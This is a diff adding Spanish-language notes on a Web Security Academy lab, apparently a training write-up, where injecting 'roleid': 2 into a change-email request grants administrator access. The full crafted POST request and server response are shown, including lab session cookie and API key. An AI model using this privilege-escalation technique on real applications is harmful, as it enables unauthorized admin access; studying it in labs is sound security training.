@@ -57,6 +57,53 @@ Connection: close
 
 ```
 
+# User role can be modified in user profile
+
+Para este laboratorio tienes que checar que en cambiar email pero en la ***respuesta*** viene un roleid de 1 si lo cambias 
+a 2 se activa el accso al panel de adminsitrador.
+
+```
+HTTP/1.1 302 Found
+Location: /my-account
+Content-Type: application/json; charset=utf-8
+Connection: close
+Content-Length: 125
+
+{
+  "username": "wiener",
+  "email": "asdfahskldf@gmail.com",
+  "apikey": "voVlkpFjjPYwDjt3rh4jZ6VGhuDrS7Pf",
+  "roleid": 2
+}
+
+```
+
+Y lo que mandas es esto
+
+```
+POST /my-account/change-email HTTP/1.1
+Host: 0a2a005f03a21519c06c546f000e003b.web-security-academy.net
+Cookie: session=OyyXUyKR5MXT6dLK4e7H6Q2ZLUMLnHeu
+Content-Length: 47
+Sec-Ch-Ua: " Not A;Brand";v="99", "Chromium";v="104"
+Sec-Ch-Ua-Mobile: ?0
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36
+Sec-Ch-Ua-Platform: "Windows"
+Content-Type: text/plain;charset=UTF-8
+Accept: */*
+Origin: https://0a2a005f03a21519c06c546f000e003b.web-security-academy.net
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: cors
+Sec-Fetch-Dest: empty
+Referer: https://0a2a005f03a21519c06c546f000e003b.web-security-academy.net/my-account?id=wiener
+Accept-Encoding: gzip, deflate
+Accept-Language: es-419,es;q=0.9
+Connection: close
+
+{"email":"asdfahskldf@gmail.com","roleid": 2
+}
+
+```
 
 
 
